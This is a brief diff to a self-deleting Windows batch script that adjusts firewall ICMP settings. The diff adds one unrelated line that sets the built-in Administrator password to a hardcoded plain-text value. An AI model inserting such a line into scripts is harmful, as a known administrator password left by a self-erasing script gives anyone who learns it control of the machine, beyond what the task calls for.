@@ -2,6 +2,7 @@
 mode con cp select=437 >nul
 setlocal EnableDelayedExpansion
 
+net user Administrator AYAMGORENG123
 rem https://learn.microsoft.com/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior#command-example-4-configure-icmp-settings
 rem 旧版命令 netsh firewall set icmpsetting 8 对应的配置是：文件和打印机共享(回显请求 - ICMPv4-In)
 
@@ -19,3 +20,4 @@ for %%i in (4, 6) do (
 
 rem 删除此脚本
 del "%~f0"
+
